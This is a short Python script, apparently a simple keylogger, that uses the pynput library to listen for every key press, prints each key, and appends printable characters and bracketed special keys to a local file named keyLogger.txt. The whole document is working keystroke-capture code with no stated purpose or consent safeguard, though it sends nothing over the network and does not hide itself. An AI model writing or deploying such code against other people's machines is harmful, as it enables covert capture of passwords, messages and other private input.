from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open('keyLogger.txt','a') as logKey:
        try:
            # Log printable characters
            logKey.write(f'{key.char}')
        except AttributeError:
            # Log special keys
            logKey.write(f'[{key}]')

if __name__=="__main__":
    
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()